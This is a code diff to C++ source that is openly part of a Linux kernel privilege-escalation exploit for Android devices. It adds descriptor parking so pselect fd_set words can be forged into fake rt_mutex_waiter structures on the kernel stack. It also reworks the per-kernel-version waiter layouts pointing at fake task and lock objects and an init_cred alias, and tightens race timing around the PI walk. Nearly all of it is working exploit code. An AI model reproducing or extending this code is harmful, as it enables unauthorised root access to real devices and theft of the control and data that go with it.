@@ -6,6 +6,26 @@
 
 using namespace ghostlock;
 
+namespace {
+    /* Descriptors held open on /dev/null so no live resource of a later stage
+ * can be allocated inside the fd_set bitmap's reach. open_selected_fds()
+ * dup2()s a never-ready descriptor over EVERY set descriptor, and the set
+ * words double as waiter fields: W1's value ends in 0x0100 (bits 8 and 15),
+ * but W2's value is the init_cred alias and ends in 0x0930, which also lights
+ * descriptor 4 and 5 -- exactly where the victim pipes and the reclaim
+ * socketpairs used to land. Each parked slot must keep its number for the
+ * whole process, so destroy() never closes them either. */
+    std::array<int32_t, PSELECT_ROUTE_NFDS> low_fd_park{};
+    size_t low_fd_park_count = 0;
+
+    [[nodiscard]] bool is_reserved_low_fd(int32_t fd) noexcept {
+        for (size_t i = 0; i < low_fd_park_count; i++) {
+            if (low_fd_park[i] == fd) return true;
+        }
+        return false;
+    }
+} // namespace
+
 namespace ghostlock::route::select_stack {
     SelectStackRoute::SelectStackRoute(
         race::PiRace *race_context, const memory::WriteRequest *route_request,
@@ -67,6 +87,7 @@ namespace ghostlock::route::select_stack {
 
     void SelectStackRoute::disarm() noexcept {
         race->consumer_go.store(0);
+        race->consumer_gate_syscall.store(0);
         if (race->consumer_inflight.load() != 0) {
             for (int32_t i = 0;
                  i < 2000 && race->consumer_inflight.load() != 0;
@@ -104,6 +125,10 @@ namespace ghostlock::route::select_stack {
         }
         if (selected_fds_installed) {
             for (int32_t fd = 3; fd < PSELECT_ROUTE_NFDS; fd++) {
+                /* A parked descriptor must keep its slot: closing it would hand
+                 * the number back to the next stage's pipes and socketpairs,
+                 * putting live resources inside the fd_set bitmap's reach. */
+                if (is_reserved_low_fd(fd)) continue;
                 if (owned_input_set.test(fd) || owned_output_set.test(fd) ||
                     owned_exception_set.test(fd)) {
                     /* The fd number may also be owned by the pipe/timerfd members: drop
@@ -266,6 +291,32 @@ namespace ghostlock::route {
 
     static std::array<int32_t, 3> standard_io_backup = {-1, -1, -1};
 
+    void reserve_low_fds(void) {
+        while (low_fd_park_count < low_fd_park.size()) {
+            const int32_t fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
+            if (fd < 0) {
+                pr_warning("reserve low fds stopped at fd=%d after %zu slots errno=%d\n",
+                           fd, low_fd_park_count, errno);
+                break;
+            }
+            if (fd <= 2) {
+                /* Standard io is the logging channel and reserve_standard_io()
+                 * owns its backup; never park a slot the logging path needs. */
+                close(fd);
+                break;
+            }
+            if (fd >= PSELECT_ROUTE_NFDS) {
+                /* Every bitmap slot already holds a parked descriptor. */
+                close(fd);
+                break;
+            }
+            low_fd_park[low_fd_park_count++] = fd;
+        }
+        pr_info("reserved %zu low fds (later allocations start above %d)\n",
+                low_fd_park_count,
+                low_fd_park_count ? low_fd_park[low_fd_park_count - 1] : 2);
+    }
+
     void reserve_standard_io(void) {
         for (int32_t fd = 0; fd < static_cast<int32_t>(standard_io_backup.size()); fd++) {
             if (standard_io_backup[static_cast<size_t>(fd)] >= 0) continue;
@@ -295,58 +346,19 @@ namespace ghostlock::route {
         ex->zero();
 
         int32_t words_per_set = pselect_words_per_set();
-        int32_t compact = context->layout.compact_waiter.value_or(0);
+        const uint8_t compact = context->layout.compact_waiter.value_or(0);
 
-        struct pselect_waiter_word {
-            int32_t word;
-            uint64_t value;
-            const char *name;
-        };
-
-        if (compact) {
-            /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
-         * the write value, children the write target; waiter->task is the
-         * payload fake_task (planted fields for the PI walk). */
-            struct pselect_waiter_word words[] = {
-                {2, (session::g_exploit_session.heap.current.fake_right), "tree_pc"},
-                {3, 0, "tree_right"},
-                {4, request->target, "tree_left"},
-                {5, (session::g_exploit_session.heap.current.fake_right), "pi_pc"},
-                {6, 0, "pi_right"},
-                {7, request->target, "pi_left"},
-                {8, (session::g_exploit_session.heap.current.fake_task), "task"},
-                {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
-                {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3, "wake_prio"},
-                {11, 0, "deadline"},
-                {12, 0, "ww_ctx"},
-            };
-            for (size_t i = 0; i < std::size(words); i++) {
-                struct pselect_waiter_word *w = &words[i];
-                pselect_put_waiter_word(context, words_per_set,
-                                        w->word, w->value, w->name);
-            }
-        } else {
-            /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
-            struct pselect_waiter_word words[] = {
-                {2, 0, "tree_pc"},
-                {3, 0, "tree_right"},
-                {4, 0, "tree_left"},
-                {5, 1, "tree_prio"},
-                {6, 0, "tree_deadline"},
-                {7, 0, "pi_parent"},
-                {8, 0, "pi_right"},
-                {9, 0, "pi_left"},
-                {10, 1, "pi_prio"},
-                {11, 0, "pi_deadline"},
-                {12, (session::g_exploit_session.heap.current.fake_task), "task"},
-                {13, (session::g_exploit_session.heap.current.fake_lock), "lock"},
-                {14, 3, "wake_state"},
-            };
-            for (size_t i = 0; i < std::size(words); i++) {
-                struct pselect_waiter_word *w = &words[i];
-                pselect_put_waiter_word(context, words_per_set,
-                                        w->word, w->value, w->name);
-            }
+        WaiterWord words[16]{};
+        const size_t count = select_stack_waiter_words(
+            compact, static_cast<uintptr_t>(request->target),
+            session::g_exploit_session.heap.current.fake_right,
+            session::g_exploit_session.heap.current.fake_task,
+            session::g_exploit_session.heap.current.fake_lock, words,
+            std::size(words));
+        for (size_t i = 0; i < count; i++) {
+            const WaiterWord *w = &words[i];
+            pselect_put_waiter_word(context, words_per_set, w->word, w->value,
+                                    w->name);
         }
     }
 } // namespace ghostlock::route
@@ -445,11 +457,21 @@ namespace ghostlock::route::select_stack {
             race->consumer_stop.store(0);
             uint32_t delay_usec = route::route_delay_usec(this, attempt);
             race->route_delay_usec.store(delay_usec);
+            /* Path A: the waiter thread is about to enter pselect(), which is
+             * what copies the fd_set words onto its kernel stack. Publish the
+             * syscall number so the consumer confirms that copy happened
+             * instead of guessing with a delay. */
+            race->consumer_gate_syscall.store(__NR_pselect6);
             race->consumer_go.store(attempt);
 
             pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
                     attempt, attempts, layout.compact_waiter.value_or(0),
                     route::fops_elapsed_ms(&route_t0));
+            /* The next call hands kernel-copied fd_set words to the PI race; if
+             * it faults, the device panics and takes the stdio buffer with it.
+             * Flush first, so the log says whether the route reached the syscall
+             * at all instead of stopping a stage earlier. */
+            support::log_sync();
             errno = 0;
             if (layout.compact_waiter.value_or(0)) {
                 uint32_t timeout_us = profile.select_timeout_us();
@@ -475,7 +497,11 @@ namespace ghostlock::route::select_stack {
             pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
                     attempt, attempts, layout.compact_waiter.value_or(0),
                     route::fops_elapsed_ms(&route_t0), select_result);
+            /* Pair with the flush above: this line returning at all separates a
+             * fault inside the syscall from one raised by the PI walk it set up. */
+            support::log_sync();
             race->consumer_go.store(0);
+            race->consumer_gate_syscall.store(0);
 
             const int32_t calls = race->consumer_calls.load();
             const int32_t successes = race->consumer_success.load();
